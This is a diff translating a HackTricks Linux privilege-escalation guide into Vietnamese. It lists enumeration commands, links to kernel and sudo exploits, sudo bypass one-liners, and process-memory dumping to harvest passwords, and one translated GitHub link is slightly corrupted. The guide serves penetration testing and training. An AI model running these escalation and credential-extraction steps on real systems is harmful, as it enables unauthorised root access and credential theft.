@@ -1,14 +1,14 @@
-# Linux Privilege Escalation
+# Leo thang đặc quyền Linux
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-For broader background and historical enumeration workflows, compare the g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation, and linux-private-i resources listed in the references.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>
+Để tìm hiểu thêm về bối cảnh và quy trình liệt kê lịch sử, hãy tham khảo các tài nguyên g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation và linux-private-i được liệt kê trong phần tài liệu tham khảo.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>
 
-## System Information
+## Thông tin hệ thống
 
-### OS info
+### Thông tin hệ điều hành
 
-Let's start gaining some knowledge of the OS running
+Hãy bắt đầu tìm hiểu về hệ điều hành đang chạy.
 
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
@@ -16,17 +16,17 @@ lsb_release -a 2>/dev/null # old, not by default on many systems
 cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
 
-### Path
+### Đường dẫn
 
-If you **have write permissions on any folder inside the `PATH`** variable you may be able to hijack some libraries or binaries:
+Nếu bạn **có quyền ghi vào bất kỳ thư mục nào trong biến `PATH`**, bạn có thể chiếm quyền một số thư viện hoặc binary:
 
 ```bash
 echo $PATH
 ```
 
-### Env info
+### Thông tin môi trường
 
-Interesting information, passwords or API keys in the environment variables?
+Có thông tin thú vị, mật khẩu hoặc API key nào trong các biến môi trường không?
 
 ```bash
 (env || set) 2>/dev/null
@@ -34,9 +34,9 @@ Interesting information, passwords or API keys in the environment variables?
 
 ### Kernel exploits
 
-Check the kernel version and if there is some exploit that can be used to escalate privileges
+Kiểm tra phiên bản kernel và xem có exploit nào có thể dùng để leo thang đặc quyền hay không.
 
-The [Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) collects local escalation cases and links to the deeper Linux kernel write-ups in Binary Exploitation. Verify the affected build and configuration before testing a case study.
+Phần [Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) tổng hợp các trường hợp leo thang đặc quyền cục bộ và liên kết đến các bài viết chuyên sâu hơn về Linux kernel trong Binary Exploitation. Hãy xác minh bản build và cấu hình bị ảnh hưởng trước khi thử nghiệm một trường hợp.
 
 ```bash
 cat /proc/version
@@ -44,24 +44,24 @@ uname -a
 searchsploit "Linux Kernel"
 ```
 
-You can find a good vulnerable kernel list and some already **compiled exploits** here: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
-Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
+Bạn có thể tìm danh sách kernel dễ bị tấn công khá tốt và một số **exploit đã biên dịch** ở đây: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) và [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
+Một số trang web khác có **exploit đã biên dịch**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
-To extract all the vulnerable kernel versions from that web you can do:
+Để trích xuất tất cả phiên bản kernel dễ bị tấn công từ trang web đó, bạn có thể chạy:
 
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
 
-Tools that could help to search for kernel exploits are:
+Các công cụ có thể giúp tìm kiếm các kernel exploit:
 
 [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
 [linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
-[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)
+[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (chạy trên máy nạn nhân, chỉ kiểm tra exploit cho kernel 2.x)
 
-Always **search the kernel version in Google**, maybe your kernel version is written in some kernel exploit and then you will be sure that this exploit is valid.
+Luôn **tìm kiếm phiên bản kernel trên Google**; có thể phiên bản kernel của bạn được ghi trong một kernel exploit, khi đó bạn sẽ chắc chắn exploit này có hiệu lực.
 
-Additional kernel exploitation techniques:
+Các kỹ thuật khai thác kernel bổ sung:
 
 {{#ref}}
 ../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
@@ -72,7 +72,7 @@ Additional kernel exploitation techniques:
 
 ### CVE-2016-5195 (DirtyCow)
 
-Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+Leo thang đặc quyền Linux - Linux Kernel <= 3.19.0-73.8
 
 ```bash
 # make dirtycow stable
@@ -82,15 +82,15 @@ https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
 ```
 
-### Sudo version
+### Phiên bản Sudo
 
-Based on the vulnerable sudo versions that appear in:
+Dựa trên các phiên bản sudo dễ bị tấn công xuất hiện trong:
 
 ```bash
 searchsploit sudo
 ```
 
-You can check if the sudo version is vulnerable using this grep.
+Bạn có thể dùng grep này để kiểm tra phiên bản sudo có dễ bị tấn công hay không.
 
 ```bash
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
@@ -98,21 +98,21 @@ sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.
 
 ### Sudo < 1.9.17p1
 
-Upstream sudo **1.9.14 through 1.9.17** allows unprivileged local users to escalate to root via the `--chroot` option when sudo loads `/etc/nsswitch.conf` from a user-controlled directory; upstream fixed this in **1.9.17p1**. Check every executable root-setuid sudo binary in the relevant paths, since `sudo -V` reports only the binary selected by `PATH`. Distribution packages may backport the fix without changing the upstream version string, so verify the vendor package status too. See the [sudo maintainer's advisory](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>
+Các phiên bản sudo upstream **1.9.14 đến 1.9.17** cho phép người dùng cục bộ không có đặc quyền nâng quyền lên root thông qua tùy chọn `--chroot` khi sudo tải `/etc/nsswitch.conf` từ một thư mục do người dùng kiểm soát; upstream đã khắc phục lỗi này trong **1.9.17p1**. Kiểm tra mọi binary sudo root-setuid có thể thực thi trong các đường dẫn liên quan, vì `sudo -V` chỉ báo cáo binary được chọn qua `PATH`. Các gói của bản phân phối có thể backport bản sửa lỗi mà không thay đổi chuỗi phiên bản upstream, vì vậy hãy kiểm tra cả trạng thái gói của nhà cung cấp. Xem [khuyến cáo của maintainer sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>
 
-Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.  
+Đây là một [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) để khai thác [lỗ hổng](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) đó. Trước khi chạy exploit, hãy đảm bảo phiên bản `sudo` của bạn dễ bị tấn công và hỗ trợ tính năng `chroot`.
 
-For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>
+Để biết thêm thông tin, hãy tham khảo [khuyến cáo về lỗ hổng](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) ban đầu.<sup>[[28]](#references)</sup>
 
-### Sudo host-based rules bypass (CVE-2025-32462)
+### Bỏ qua quy tắc sudo dựa trên host (CVE-2025-32462)
 
-Upstream sudo **1.8.8 through 1.9.17** can evaluate host-based sudoers rules using the **user-supplied hostname** from `sudo -h <host>` instead of the **real hostname**; upstream fixed this in **1.9.17p1**. The user must still have a matching sudoers entry on the selected host. Review vendor backports and alternate sudo binaries as well as the local policy. See the [sudo maintainer's advisory](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>
+Các phiên bản sudo upstream **1.8.8 đến 1.9.17** có thể đánh giá quy tắc sudoers dựa trên host bằng **hostname do người dùng cung cấp** từ `sudo -h <host>` thay vì **hostname thực**; upstream đã khắc phục lỗi này trong **1.9.17p1**. Người dùng vẫn phải có mục sudoers khớp trên host được chọn. Hãy kiểm tra cả các bản backport của nhà cung cấp và các binary sudo thay thế, cũng như policy cục bộ. Xem [khuyến cáo của maintainer sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>
 
-Requirements:
-- Vulnerable sudo version
-- Host-specific sudoers rules (host is neither the current hostname nor `ALL`)
+Yêu cầu:
+- Phiên bản sudo dễ bị tấn công
+- Quy tắc sudoers dành riêng cho host (host không phải hostname hiện tại và cũng không phải `ALL`)
 
-Example sudoers pattern:
+Mẫu sudoers ví dụ:
 
 ```
 Host_Alias     SERVERS = devbox, prodbox
@@ -120,32 +120,32 @@ Host_Alias     PROD    = prodbox
 alice          SERVERS, !PROD = NOPASSWD:ALL
 ```
 
-Exploit by spoofing the allowed host:
+Khai thác bằng cách giả mạo host được phép:
 
 ```bash
 sudo -h devbox id
 sudo -h devbox -i
 ```
 
-If resolution of the selected name blocks, verify how that name resolves on the host. Merely seeing a name in a log or configuration file does not make it resolvable, and changing `/etc/hosts` normally requires privileged write access.
+Nếu việc phân giải tên được chọn bị chặn, hãy xác minh cách tên đó được phân giải trên máy chủ. Việc chỉ thấy tên trong nhật ký hoặc tệp cấu hình không có nghĩa là tên đó có thể được phân giải; việc sửa đổi `/etc/hosts` thường yêu cầu quyền ghi đặc quyền.
 
 #### sudo < v1.8.28
 
-This [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) requires an effective sudo rule that permits a command as `ALL` users while excluding root, such as `(ALL, !root) /bin/bash`. The caller must also be allowed to use that rule, including any authentication requirement. Check the installed package advisory: vendors backported the fix into releases whose displayed upstream version is still below 1.8.28. A `!root` rule or an old version alone does not confirm exposure. Do not test a privileged command during passive enumeration.
+Lỗ hổng [bypass Runas UID upstream](https://ubuntu.com/security/CVE-2019-14287) này yêu cầu có quy tắc sudo hiệu lực cho phép chạy lệnh với tư cách `ALL` người dùng nhưng loại trừ root, chẳng hạn `(ALL, !root) /bin/bash`. Người gọi cũng phải được phép sử dụng quy tắc đó, kể cả khi có yêu cầu xác thực. Hãy kiểm tra thông báo bảo mật của gói đã cài đặt: các nhà cung cấp đã backport bản sửa lỗi vào những bản phát hành có phiên bản upstream hiển thị vẫn thấp hơn 1.8.28. Chỉ có quy tắc `!root` hoặc phiên bản cũ không đủ để xác nhận hệ thống bị ảnh hưởng. Không chạy thử lệnh đặc quyền trong quá trình liệt kê thụ động.
 
 ```
 sudo -u#-1 /bin/bash
 ```
 
-### Dmesg signature verification failed
+### Dmesg xác minh chữ ký thất bại
 
-Check **smasher2 box of HTB** for an **example** of how this vuln could be exploited
+Kiểm tra **box smasher2 của HTB** để xem **ví dụ** về cách có thể khai thác vuln này.
 
 ```bash
 dmesg 2>/dev/null | grep "signature"
 ```
 
-### More system enumeration
+### Liệt kê thêm thông tin hệ thống
 
 ```bash
 date 2>/dev/null #Date
@@ -154,7 +154,7 @@ lscpu #CPU info
 lpstat -a 2>/dev/null #Printers info
 ```
 
-## Enumerate possible defenses
+## Liệt kê các biện pháp phòng thủ khả thi
 
 ### AppArmor
 
@@ -203,16 +203,16 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 
 ## Container Breakout
 
-If you are inside a container, start with the following container-security section and then pivot into the runtime-specific abuse pages:
+Nếu bạn đang ở trong một container, hãy bắt đầu với phần bảo mật container sau đó chuyển sang các trang khai thác đặc thù cho runtime:
 
 
 {{#ref}}
 ../../containers-namespaces/container-security/
 {{#endref}}
 
-## Drives
+## Ổ đĩa
 
-Check **what is mounted and unmounted**, where and why. If anything is unmounted you could try to mount it and check for private info
+Kiểm tra **những gì đang được mount và unmount**, ở đâu và vì sao. Nếu có thứ gì chưa được mount, bạn có thể thử mount nó rồi kiểm tra thông tin riêng tư.
 
 ```bash
 ls /dev 2>/dev/null | grep -i "sd"
@@ -221,37 +221,37 @@ cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
 ```
 
-## Useful software
+## Phần mềm hữu ích
 
-Enumerate useful binaries
+Liệt kê các tệp nhị phân hữu ích
 
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
 
-Also, check if **any compiler is installed**. This is useful if you need to use some kernel exploit as it's recommended to compile it in the machine where you are going to use it (or in one similar)
+Ngoài ra, hãy kiểm tra xem có compiler nào được cài đặt hay không. Điều này hữu ích nếu bạn cần sử dụng một kernel exploit, vì nên biên dịch nó trên máy mà bạn sẽ sử dụng (hoặc trên một máy tương tự).
 
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
 
-### Vulnerable Software Installed
+### Phần mềm dễ bị tấn công đã cài đặt
 
-Check for the **version of the installed packages and services**. Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges…\
-It is recommended to check manually the version of the more suspicious installed software.
+Kiểm tra **phiên bản của các gói và dịch vụ đã cài đặt**. Có thể có một phiên bản Nagios cũ (chẳng hạn) có thể bị khai thác để leo thang đặc quyền…\
+Bạn nên kiểm tra thủ công phiên bản của những phần mềm đáng ngờ hơn đã cài đặt.
 
 ```bash
 dpkg -l #Debian
 rpm -qa #Centos
 ```
 
-If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.
+Nếu có quyền truy cập SSH vào máy, bạn cũng có thể dùng **openVAS** để kiểm tra phần mềm lỗi thời và dễ bị tấn công được cài đặt trên máy.
 
-> [!NOTE] > _Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some applications like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits_
+> [!NOTE] > _Lưu ý rằng các lệnh này sẽ hiển thị rất nhiều thông tin, phần lớn không hữu ích. Vì vậy, bạn nên dùng các ứng dụng như OpenVAS hoặc công cụ tương tự để kiểm tra xem phiên bản phần mềm đã cài đặt nào có dễ bị tấn công bởi các exploit đã biết hay không._
 
 ## Processes
 
-Take a look at **what processes** are being executed and check if any process has **more privileges than it should** (maybe a tomcat being executed by root?)
+Hãy xem **những process nào** đang được thực thi và kiểm tra xem có process nào có **nhiều quyền hơn mức cần thiết** hay không (có thể là tomcat đang được thực thi bởi root?).
 
 ```bash
 ps aux
@@ -259,27 +259,27 @@ ps -ef
 top -n 1
 ```
 
-Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
-Also **check your privileges over the processes binaries**, maybe you can overwrite someone.
+Luôn kiểm tra xem có [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) nào đang chạy không; bạn có thể lợi dụng chúng để leo thang đặc quyền. **Linpeas** phát hiện chúng bằng cách kiểm tra tham số `--inspect` trong dòng lệnh của tiến trình.\
+Ngoài ra, hãy **kiểm tra quyền của bạn đối với các binary của tiến trình**; có thể bạn ghi đè được binary của ai đó.
 
-### Cross-user parent-child chains
+### Chuỗi tiến trình cha-con giữa các người dùng
 
-A child process running under a **different user** than its parent is not automatically malicious, but it is a useful **triage signal**. Some transitions are expected (`root` spawning a service user, login managers creating session processes), but unusual chains can reveal wrappers, debug helpers, persistence, or weak runtime trust boundaries.
+Tiến trình con chạy dưới **người dùng khác** với tiến trình cha không tự động là hành vi độc hại, nhưng đây là một **tín hiệu hữu ích để phân loại**. Một số chuyển đổi là bình thường (`root` khởi chạy một service user, trình quản lý đăng nhập tạo các tiến trình phiên), nhưng những chuỗi bất thường có thể cho thấy wrapper, debug helper, persistence hoặc ranh giới tin cậy runtime yếu.
 
-Quick review:
+Kiểm tra nhanh:
 
 ```bash
 ps -eo pid,ppid,user,comm,args --sort=ppid
 pstree -alp
 ```
 
-If you find a surprising chain, inspect the parent command line and all files that influence its behavior (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). In several real privesc paths the child itself was not writable, but the **parent-controlled config** or helper chain was.
+Nếu tìm thấy một chuỗi bất ngờ, hãy kiểm tra command line của tiến trình cha và mọi tệp ảnh hưởng đến hành vi của nó (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Trong một số đường dẫn privesc thực tế, bản thân tiến trình con không thể ghi được, nhưng **config do tiến trình cha kiểm soát** hoặc chuỗi helper thì có thể.
 
-### Deleted executables and deleted-open files
+### Executable đã bị xóa và tệp đang mở đã bị xóa
 
-Runtime artifacts are often still accessible **after deletion**. This is useful both for privilege escalation and for recovering evidence from a process that already has sensitive files open.
+Các hiện vật runtime thường vẫn truy cập được **sau khi bị xóa**. Điều này hữu ích cho cả việc leo thang đặc quyền lẫn khôi phục bằng chứng từ một tiến trình đang mở các tệp nhạy cảm.
 
-Check for deleted executables:
+Kiểm tra các executable đã bị xóa:
 
 ```bash
 pid=<PID>
@@ -288,56 +288,56 @@ readlink /proc/$pid/exe
 tr '\0' ' ' </proc/$pid/cmdline; echo
 ```
 
-If `/proc/<PID>/exe` points to `(deleted)`, the process is still running the old binary image from memory. That is a strong signal to investigate because:
+Nếu `/proc/<PID>/exe` trỏ đến `(deleted)`, tiến trình vẫn đang chạy image nhị phân cũ từ bộ nhớ. Đây là dấu hiệu đáng để điều tra vì:
 
-- the removed executable may contain interesting strings or credentials
-- the running process may still expose useful file descriptors
-- a deleted privileged binary can indicate recent tampering or attempted cleanup
+- tệp thực thi đã bị xóa có thể chứa các chuỗi hoặc thông tin xác thực đáng chú ý
+- tiến trình đang chạy vẫn có thể cung cấp các file descriptor hữu ích
+- một tệp nhị phân đặc quyền đã bị xóa có thể cho thấy có hành vi can thiệp gần đây hoặc nỗ lực dọn dẹp
 
-Collect deleted-open files globally:
+Thu thập các tệp đã bị xóa nhưng vẫn đang mở trên toàn hệ thống:
 
 ```bash
 lsof +L1
 ```
 
-If you find an interesting descriptor, recover it directly:
+Nếu bạn tìm thấy một descriptor thú vị, hãy khôi phục nó trực tiếp:
 
 ```bash
 ls -l /proc/<PID>/fd
 cat /proc/<PID>/fd/<FD>
 ```
 
-This is especially valuable when a process still has a deleted secret, script, database export, or flag file open.
+Điều này đặc biệt hữu ích khi một process vẫn đang mở một secret, script, bản xuất database hoặc flag file đã bị xóa.
 
-### Process monitoring
+### Giám sát process
 
-You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.
+Bạn có thể dùng các công cụ như [**pspy**](https://github.com/DominicBreuker/pspy) để giám sát process. Việc này có thể rất hữu ích để xác định các process dễ bị tấn công được thực thi thường xuyên hoặc khi một tập hợp yêu cầu được đáp ứng.
 
-#### Linux ProcMon under sudo
+#### Linux ProcMon với sudo
 
-[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) can trace selected processes and system calls and save a SQLite trace. If `sudo -l` allows an unrestricted root-capable `procmon` command, consider whether it could observe another user's process input or output. The permission is only a review lead: tracer support, effective policy, and the activity of a suitable process all matter. Trace files can contain secrets, so inspect authorized exports carefully and avoid collecting unrelated processes.
+[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) có thể trace các process và system call được chọn rồi lưu trace vào SQLite. Nếu `sudo -l` cho phép chạy lệnh `procmon` không bị giới hạn và có khả năng chạy với quyền root, hãy cân nhắc liệu nó có thể quan sát input hoặc output của process thuộc người dùng khác hay không. Quyền này chỉ là một gợi ý cần xem xét: mức hỗ trợ của tracer, policy đang có hiệu lực và hoạt động của một process phù hợp đều rất quan trọng. Các file trace có thể chứa secrets, vì vậy hãy kiểm tra cẩn thận các bản xuất được phép và tránh thu thập dữ liệu từ những process không liên quan.
 
-### Process memory
+### Bộ nhớ process
 
-Some services of a server save **credentials in clear text inside the memory**.\
-Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
-However, remember that **as a regular user you can read the memory of the processes you own**.
+Một số dịch vụ trên server lưu **credentials ở dạng clear text trong bộ nhớ**.\
+Thông thường, bạn cần **quyền root** để đọc bộ nhớ của các process thuộc người dùng khác, vì vậy cách này thường hữu ích hơn khi bạn đã có quyền root và muốn tìm thêm credentials.\
+Tuy nhiên, hãy nhớ rằng **người dùng thông thường có thể đọc bộ nhớ của các process thuộc sở hữu của mình**.
 
 > [!WARNING]
-> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
+> Lưu ý rằng hiện nay hầu hết máy **không cho phép ptrace theo mặc định**, nghĩa là bạn không thể dump các process khác thuộc người dùng không có đặc quyền của mình.
 >
-> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
+> File _**/proc/sys/kernel/yama/ptrace_scope**_ kiểm soát quyền truy cập ptrace:
 >
-> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
-> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
-> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
-> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.
+> - **kernel.yama.ptrace_scope = 0**: có thể debug mọi process, miễn là chúng có cùng uid. Đây là cách ptracing hoạt động theo kiểu cổ điển.
+> - **kernel.yama.ptrace_scope = 1**: chỉ có thể debug process cha.
+> - **kernel.yama.ptrace_scope = 2**: chỉ admin mới có thể dùng ptrace, vì cần capability CAP_SYS_PTRACE.
+> - **kernel.yama.ptrace_scope = 3**: không process nào có thể bị trace bằng ptrace. Sau khi đặt giá trị này, cần khởi động lại để bật lại ptracing.
 
-A same-UID process that briefly unlocks a password vault can be a separate credential boundary. When tracing is permitted, an active, dumpable process may expose the vault password through its input syscalls or memory, even though the encrypted vault file itself remains protected. `ptrace_scope=0` is only one prerequisite: matching credentials, target dumpability, other Linux security modules, and the process lifetime also matter. A vault entry becoming a Unix root login requires a separate credential-reuse check. Routine enumeration should report the policy and candidate process or vault paths, not capture input or print secrets. See the [kernel's Yama documentation](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) and [ptrace access checks](https://man7.org/linux/man-pages/man2/ptrace.2.html).
+Một process có cùng UID, tạm thời mở khóa password vault, có thể tạo ra một ranh giới credential riêng. Khi được phép tracing, một process đang hoạt động và có thể dump có thể làm lộ password vault thông qua các input syscall hoặc bộ nhớ của nó, dù bản thân file vault đã mã hóa vẫn được bảo vệ. `ptrace_scope=0` chỉ là một điều kiện tiên quyết: credentials trùng khớp, khả năng dump của process mục tiêu, các Linux security module khác và thời gian tồn tại của process cũng rất quan trọng. Việc một mục trong vault trở thành thông tin đăng nhập Unix root cần được kiểm tra riêng về khả năng tái sử dụng credential. Hoạt động liệt kê thông thường nên báo cáo policy và process hoặc đường dẫn vault tiềm năng, không thu thập input hay in secrets. Xem [tài liệu Yama của kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) và [các bước kiểm tra quyền truy cập ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).
 
 #### GDB
 
-If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
+Ví dụ, nếu bạn có quyền truy cập bộ nhớ của một dịch vụ FTP, bạn có thể lấy Heap và tìm credentials bên trong.
 
 ```bash
 gdb -p <FTP_PROCESS_PID>
@@ -363,7 +363,7 @@ done
 
 #### /proc/$pid/maps & /proc/$pid/mem
 
-For a given process ID, **maps show how memory is mapped within that process's** virtual address space; it also shows the **permissions of each mapped region**. The **mem** pseudo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.
+Với một ID tiến trình cụ thể, **maps cho biết bộ nhớ được ánh xạ như thế nào trong không gian địa chỉ ảo của tiến trình đó**; nó cũng hiển thị **quyền của từng vùng được ánh xạ**. Tệp giả **mem** **cung cấp quyền truy cập trực tiếp vào bộ nhớ của tiến trình**. Từ tệp **maps**, chúng ta biết **những vùng bộ nhớ nào có thể đọc được** và các offset của chúng. Chúng ta dùng thông tin này để **seek đến các vị trí tương ứng trong tệp mem và dump tất cả các vùng có thể đọc được** vào một tệp.
 
 ```bash
 procdump()
@@ -380,8 +380,8 @@ procdump()
 
 #### /dev/mem
 
-`/dev/mem` provides access to the system's **physical** memory, not the virtual memory. The kernel's virtual address space can be accessed using /dev/kmem.\
-Typically, `/dev/mem` is only readable by **root** and **kmem** group.
+`/dev/mem` cung cấp quyền truy cập vào bộ nhớ **vật lý** của hệ thống, không phải bộ nhớ ảo. Có thể truy cập không gian địa chỉ ảo của kernel bằng /dev/kmem.\
+Thông thường, chỉ **root** và nhóm **kmem** mới có quyền đọc `/dev/mem`.
 
 ```
 strings /dev/mem -n10 | grep -i PASS
@@ -389,7 +389,7 @@ strings /dev/mem -n10 | grep -i PASS
 
 ### ProcDump for linux
 
-ProcDump is a Linux reimagining of the classic ProcDump tool from the Sysinternals suite of tools for Windows. Get it in [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
+ProcDump là phiên bản tái hiện trên Linux của công cụ ProcDump kinh điển thuộc bộ công cụ Sysinternals dành cho Windows. Tải công cụ tại [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
 
 ```
 procdump -p 1714
@@ -418,26 +418,26 @@ Press Ctrl-C to end monitoring without terminating the process.
 [20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
 ```
 
-### Tools
+### Công cụ
 
-To dump a process memory you could use:
+Để dump bộ nhớ của một tiến trình, bạn có thể dùng:
 
 - [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
-- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_You can manually remove root requirements and dump the process owned by you
-- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)
+- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Bạn có thể tự xóa yêu cầu root và dump tiến trình do bạn sở hữu
+- Script A.5 từ [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (cần root)
 
-### Credentials from Process Memory
+### Thông tin xác thực từ bộ nhớ tiến trình
 
-#### Manual example
+#### Ví dụ thủ công
 
-If you find that the authenticator process is running:
+Nếu bạn phát hiện tiến trình authenticator đang chạy:
 
 ```bash
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
 ```
 
-You can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memory:
+Bạn có thể dump tiến trình (xem các phần trước để tìm những cách khác nhau nhằm dump bộ nhớ của tiến trình) và tìm kiếm thông tin đăng nhập bên trong bộ nhớ:
 
 ```bash
 ./dump-memory.sh 2027
@@ -446,18 +446,18 @@ strings *.dump | grep -i password
 
 #### mimipenguin
 
-The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) will **steal clear text credentials from memory** and from some **well known files**. It requires root privileges to work properly.
+Công cụ [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sẽ **đánh cắp thông tin xác thực dạng văn bản thuần từ bộ nhớ** và từ một số **tệp phổ biến**. Công cụ cần quyền root để hoạt động chính xác.
 
-| Feature                                           | Process Name         |
+| Tính năng                                         | Tên tiến trình       |
 | ------------------------------------------------- | -------------------- |
-| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
+| Mật khẩu GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
 | Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
 | LightDM (Ubuntu Desktop)                          | lightdm              |
-| VSFTPd (Active FTP Connections)                   | vsftpd               |
-| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
-| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |
